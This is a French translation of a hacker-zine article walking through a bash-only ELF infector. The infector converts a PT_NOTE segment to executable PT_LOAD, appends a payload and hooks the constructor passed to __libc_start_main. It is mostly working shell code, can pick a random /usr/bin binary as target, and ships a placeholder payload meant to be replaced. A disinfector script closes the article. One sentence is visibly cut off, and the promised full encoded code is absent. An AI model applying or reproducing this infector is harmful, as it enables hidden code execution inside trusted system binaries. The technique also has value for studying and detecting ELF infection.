Hey hey amateurs d'ELF, RiS l'homme des cavernes ici, vous apportant une note 
rapide sur comment faire se soumettre ces ELFs dans des environnements restreints 
sans compilateurs ou protocoles de transfert de fichiers faciles à utiliser.

Les lecteurs se souviennent peut-être d'une technique d'infection ELF discutée dans 
la première release de tmp.0ut appelée infection PT_NOTE. L'infection PT_NOTE tire 
avantage d'un comportement des compilateurs modernes qui ajoutent des segments aux 
binaires ELF contenant des informations auxiliaires dans diverses sections .note. 
La page de manuel ELF d'Ubuntu 20.04 inclut une description de quelques sections 
.note qui font maintenant partie d'un objet ELF standard :

  .note    This section holds various notes.  This section is of type SHT_NOTE.  No attribute
           types are used.

  .note.ABI-tag
            This section is used to declare the expected run-time ABI of the  ELF  image.   It
            may  include the operating system name and its run-time versions.  This section is
            of type SHT_NOTE.  The only attribute used is SHF_ALLOC.

  .note.gnu.build-id
            This section is used to hold an ID that uniquely identifies the  contents  of  the
            ELF  image.   Different  files with the same build ID should contain the same exe‐
            cutable content.  See the --build-id option to the GNU linker (ld  (1))  for  more
            details.  This section is of type SHT_NOTE.  The only attribute used is SHF_ALLOC.

  .note.GNU-stack
            This  section  is used in Linux object files for declaring stack attributes.  This
            section is of type SHT_PROGBITS.  The only attribute used is SHF_EXECINSTR.   This
            indicates to the GNU linker that the object file requires an executable stack.

Un contrôle rapide montre que les compilateurs modernes tels que GCC 10 et LLVM 12 
émettent tous deux certaines de ces sections par défaut :

  $ cat hello.c
  #include <stdio.h>
  int main() { printf("hello tmp.0ut\n"); }
  $ gcc -v 2>&1 | tail -1
  gcc version 10.3.0 (Ubuntu 10.3.0-1ubuntu1~20.04)
  $ gcc -o hello hello.c
  $ objdump -h hello | grep -i note
    1 .note.gnu.property 00000020  0000000000000338  0000000000000338  00000338  2**3
    2 .note.gnu.build-id 00000024  0000000000000358  0000000000000358  00000358  2**2
    3 .note.ABI-tag 00000020  000000000000037c  000000000000037c  0000037c  2**2
  
  $ clang -v 2>&1 | head -1
  Ubuntu clang version 12.0.0-3ubuntu1~20.04.4
  $ clang -o hello hello.c
  $ objdump -h hello | grep -i note
    1 .note.gnu.build-id 00000024  00000000004002c4  00000000004002c4  000002c4  2**2
    2 .note.ABI-tag 00000020  00000000004002e8  00000000004002e8  000002e8  2**2

En restant avec la sortie du compilateur GCC, nous pouvons ensuite voir que ces 
sections sont situées dans des segments mémoire définis comme PT_NOTE dans la table 
des en-têtes de programme ELF :

  $ objdump -p hello | grep -i note
      NOTE off    0x0000000000000338 vaddr 0x0000000000000338 paddr 0x0000000000000338 align 2**3
      NOTE off    0x0000000000000358 vaddr 0x0000000000000358 paddr 0x0000000000000358 align 2**2

Bien que ces segments et sections soient ajoutés par défaut dans les compilateurs 
modernes, leur présence n'est pas requise par le linkeur ou le loader. Cela fournit 
une opportunité pratique pour un attaquant de modifier la structure ELF existante et 
de détourner une entrée PT_NOTE. Le premier objectif est de convertir une entrée 
existante de la table des en-têtes de programme PT_NOTE en PT_LOAD et de modifier 
les permissions de page pour être lisibles et exécutables afin que le segment soit 
adapté pour contenir le payload d'attaque au runtime.

Comme le titre de cet article le suggère, nous allons créer notre infecteur ELF en 
utilisant bash et des outils standards de coreutils et binutils avec l'aide de 
xxd. Je vais expliquer comment le code fonctionne en morceaux puis inclure le code 
complet compressé et encodé en base64 à la fin.

Donc d'abord définissons quelques choses, nous avons besoin d'une cible ELF pour 
commencer. Nous allons prendre un paramètre -f pour que l'utilisateur puisse 
spécifier un chemin de fichier, ou si aucun n'est spécifié, sélectionner un fichier 
aléatoire de /usr/bin jusqu'à ce que nous trouvions un ELF 64 bits. Je vais utiliser 
/bin/ls pour notre walkthrough :

  #!/bin/bash
  
  while getopts ":f:" arg; do
      case $arg in
          f)
              TARGET_PATH="${OPTARG}"
      esac
  done
  
  # select a random file from /usr/bin and make sure it's an ELF
  while [ "$TARGET_PATH" == "" ]
  do
      F=`ls /usr/bin | sort -R | head -1`
      F="/usr/bin/$F"
      SIG=`file $F | cut -d ' ' -f 2`
      [ "$SIG" == "ELF" ] && TARGET_PATH="$F"
  done
  
  # copy target for modification
  TARGET_NAME=$(basename $TARGET_PATH)
  ELF="/tmp/.${TARGET_NAME}.infected"
  cp "$TARGET_PATH" "$ELF"

Pour la brièveté, cette implémentation ne supportera que des cibles 64 bits mais il 
serait possible pour notre code de supporter à la fois des cibles 32 bits et 64 bits, 
donc définissons quelques tailles de type :

  # determine if our ELF is 32 or 64 bit
  BITS=`file $file_arg | cut -d ' ' -f 3 | cut -d '-' -f 1`
  ptr_size=$(($BITS / 8))
  word_size=4
  half_size=2

Nous aurons besoin d'une fonction pour nous permettre de lire des octets dans notre 
ELF cible. Cette fonction prend offset, length, et une variable output comme 
arguments. Nous utilisons l'outil od pour lire les valeurs sous forme de représentation 
d'entier ASCII non signé des octets parce que bash résiste fortement à la lecture 
d'octets NULL bruts dans une variable en utilisant quelque chose comme dd :

  # read_bytes offset len out_variable
  function read_bytes()
  {
      local _varname=$3
      VAL="$(A=`od -An -j $1 -N $2 -t u$2 "$ELF"` ; echo $A)"
      eval $_varname=$(($VAL))
  }

Nous avons également besoin d'une fonction pour écrire des octets qui prendra un 
offset, length, et value. Pour faire de l'édition binaire en bash, nous allons 
convertir toute valeur numérique en hexadécimal via printf, inverser l'ordre des 
octets en little endian, et utiliser xxd pour convertir en les octets réels 
représentant la valeur hex ASCII. De là nous pouvons utiliser dd pour effectuer 
l'écriture au offset approprié.

  # write_bytes offset len value
  function write_bytes()
  {
      printf "%0$(($2*2))x" $3 | tac -rs .. | xxd -p -r | dd bs=1 seek=$1 count=$2 conv=notrunc of=$ELF 2>/dev/null
  }

Nous sommes presque prêts à commencer à tabasser l'ELF mais d'abord nous devons 
déterminer quelle entrée PT_NOTE nous allons cibler. Nous pouvons faire ça avec un 
parsing ELF brut, mais comme vous êtes sur le point de le voir, nous voulons faire 
le moins possible de ça donc nous allons utiliser des outils helpers dans cette 
implémentation d'exemple. Je vais m'en tenir à utiliser objdump puisqu'il fait 
partie du paquet binutils installé sur la plupart des distributions Linux et nous 
avons juste besoin de résoudre l'index de la définition de segment dans la table 
des en-têtes de programme.

NOTE et nous faisons le calcul pour résoudre l'index de l'entrée :

  LN=`objdump -p $ELF  | grep -n NOTE | tail -1 | cut -d ':' -f 1`
  NOTE_PHX_IDX=$((($LN - 5) / 2))

Avec la configuration terminée, nous sommes prêts à commencer le parsing de l'en-tête 
ELF pour localiser l'entrée de la table des en-têtes de programme pour notre PT_NOTE 
ciblé. D'abord nous devons trouver l'offset vers le début de la table des en-têtes 
de programme qui est contenu dans Ehdr.p_phoff et aussi Ehdr.e_phentsize qui 
définit la taille de chaque entrée. Ces deux valeurs vont nous permettre de trouver 
l'entrée de la table des en-têtes de programme qui correspond à l'index du PT_NOTE 
que nous avons sélectionné ci-dessus.

  EI_NIDENT=16
  e_phoff_off=$(($EI_NIDENT + (2*$half_size) + $word_size + $ptr_size))
  e_phentsize_off=$(($e_phoff_off + $ptr_size + $ptr_size + $word_size + $half_size))
  
  read_bytes $e_phoff_off $ptr_size e_phoff
  read_bytes $e_phentsize_off $half_size e_phentsize

À partir de là nous pouvons calculer les offsets vers les champs de l'entrée PT_NOTE 
que nous ciblons :

  note_off=$(($e_phoff + $NOTE_PHX_IDX * $e_phentsize))
  note_type_off=$(($note_off))
  note_flags_off=$(($note_off + $word_size))
  note_offset_off=$(($note_flags_off + $word_size))
  note_vaddr_off=$(($note_offset_off + $ptr_size))
  note_paddr_off=$(($note_vaddr_off + $ptr_size))
  note_filesz_off=$(($note_paddr_off + $ptr_size))
  note_memsz_off=$(($note_filesz_off + $ptr_size))
  note_align_off=$(($note_memsz_off + $ptr_size))

C'est l'heure du bash ELF ! Convertons le PT_NOTE en PT_LOAD avec des permissions 
de lecture et d'exécution :

  pt_load_type='\x01\x00\x00\x00'
  pt_load_flags='\x05\x00\x00\x00'
  printf $pt_load_type | dd bs=1 seek=$note_type_off count=$half_size conv=notrunc of=$ELF 2>/dev/null
  printf $pt_load_flags | dd bs=1 seek=$note_flags_off count=$half_size conv=notrunc of=$ELF 2>/dev/null

Ensuite nous pouvons redéfinir le contenu du segment pour pointer vers notre payload. 
Nous allons ajouter notre payload à la fin de l'ELF donc nous voulons mettre à jour 
l'offset et la taille stockés dans Phdr.p_offset et Phdr.p_filesz en conséquence. 
Nous devons aussi aligner l'adresse virtuelle sur une page et rendre la taille du 
segment suffisamment grande pour contenir le payload en ajustant Phdr.p_vaddr et 
Phdr.p_memsz.

  file_size=$((`wc -c "$ELF" | cut -d ' ' -f 1`))
  file_size_PAGES=$(($file_size/4096 + 1))
  file_size_ALIGNED=$(($file_size_PAGES * 4096))
  
  segment_size=$((0x10000))
  segment_base=$((0x70000000))
  
  write_bytes $note_offset_off $ptr_size $file_size_ALIGNED
  write_bytes $note_vaddr_off $ptr_size $segment_base
  write_bytes $note_paddr_off $ptr_size $file_size_ALIGNED
  write_bytes $note_filesz_off $ptr_size $segment_size
  write_bytes $note_memsz_off $ptr_size $segment_size
  write_bytes $note_align_off $ptr_size $((0x1000))

Maintenant nous sommes prêts pour l'insertion du payload. Dans le code ci-dessous, 
nous avons rempli la fin du fichier à la limite de page la plus proche et placé un 
payload temporaire d'un opcode breakpoint int3 [0xCC] et un opcode ret [0xC3] 
après le padding. Ce payload devrait être remplacé par quelque chose de plus utile, 
mais pour l'instant il se contentera de s'arrêter dans un debugger attaché pour 
vérifier le fonctionnement de l'infecteur et permettre à l'utilisateur de retourner 
et de continuer à exécuter le programme.

Finalement nous avons besoin d'un vecteur de contrôle d'exécution. Nous aurions pu 
stocker l'offset du point d'entrée dans l'en-tête ELF et utiliser ça pour détourner 
le contrôle de l'exécution mais c'est salissant si nous voulons laisser le programme 
original s'exécuter, donc hookons le constructeur à la place.

Dans un ELF typique, le point d'entrée du programme appelle _start qui va préparer 
quelques registres et appeler __libc_start_main, en passant des pointeurs vers un 
constructeur (init), destructeur (fini), et fonction main comme nous pouvons le 
voir dans le prototype de la fonction __libc_start_main :

  int __libc_start_main(
      int *(main) (int, char * *, char * *), 
      int argc, 
      char * * ubp_av, 
      void (*init) (void), 
      void (*fini) (void), 
      void (*rtld_fini) (void), 
      void (* stack_end)
  );

Dans le désassemblage, l'adresse du constructeur est passée comme un offset relatif 
à RIP dans le registre RCX. C'est suffisant d'informations pour nous de désassembler 
le programme en cherchant l'appel à __libc_start_main et de capturer les arguments 
qui lui sont passés avec objdump :

  $ objdump --disassemble /bin/ls | grep  -B3 __libc_start_main
      67e3:       4c 8d 05 66 0d 01 00    lea    0x10d66(%rip),%r8   # 17550 <_obstack_memory_used@@Base+0x8f0>
      67ea:       48 8d 0d ef 0c 01 00    lea    0x10cef(%rip),%rcx  # 174e0 <_obstack_memory_used@@Base+0x880>
      67f1:       48 8d 3d f8 e5 ff ff    lea    -0x1a08(%rip),%rdi  # 4df0 <__sprintf_chk@plt+0x60>
      67f8:       ff 15 d2 c7 01 00       callq  *0x1c7d2(%rip)      # 22fd0 <__libc_start_main@GLIBC_2.2.5>

Pour notre infecteur, cela signifie que nous allons grep et dump quelques instructions 
avant l'appel à __libc_start_main en cherchant le load dans RCX et remplacer 
l'offset pour qu'il pointe vers l'adresse virtuelle mappante tenant notre payload.

  # hook ctor_offset
  lea_offset="0x`objdump --disassemble $ELF | grep  -B3 __libc_start_main | grep lea | grep rcx | cut -d ':' -f 1 | tr -d ' '`"
  ctor_addr_offset=$(($lea_offset + 3))
  ctor_rel_addr=$(($segment_base - $ctor_addr_offset - 4))
  
  write_bytes $ctor_addr_offset 4 $ctor_rel_addr

Maintenant notre infection est complète, nous avons tabassé cet ELF droit dans la 
soumission !

Il serait imprudent de déchaîner de telles capacités de tabassage ELF sans aussi 
libérer un désinfecteur pour aider nos amis ELF à récupérer. Voici un script bash 
additionnel pour désinfecter notre hook .ctors :

  #!/bin/bash
  
  while getopts ":f:" arg; do
      case $arg in
          f)
              file_arg="${OPTARG}"
      esac
  done
  
  [ "$file_arg" == "" ] && echo "$0 -f <file>" && exit
  
  # copy target elf for modification
  BIN=$(basename $file_arg)
  ELF="/tmp/${BIN}.disinfected"
  cp "$file_arg" "$ELF"
  echo Disinfecting $ELF
  
  OFFSET="0x`objdump --disassemble "$ELF" | grep  -B3 __libc_start_main | grep lea | grep r8 | cut -d ':' -f 1 | tr -d ' '`"
  dtor_offset=$(($OFFSET))
  
  OFFSET="0x`objdump --disassemble "$ELF" | grep  -B3 __libc_start_main | grep lea | grep rcx | cut -d ':' -f 1 | tr -d ' '`"
  ctor_offset=$(($OFFSET))
  
  CLEAR_RCX='\x48\xC7\xC1\x00\x00\x00\x00'
  CLEAR_R8='\x49\xC7\xC0\x00\x00\x00\x00'
  
  echo BEFORE disinfection:
  objdump --disassemble $ELF | grep -B3 __libc_start_main
  
  # disable CTOR
  printf $CLEAR_RCX | dd bs=1 seek=$ctor_offset count=7 conv=notrunc of=$ELF 2>/dev/null
  
  # disable DTOR
  printf $CLEAR_R8 | dd bs=1 seek=$dtor_offset count=7 conv=notrunc of=$ELF 2>/dev/null
  
  echo ""
  echo AFTER disinfection:
  objdump --disassemble $ELF | grep -B3 __libc_start_main
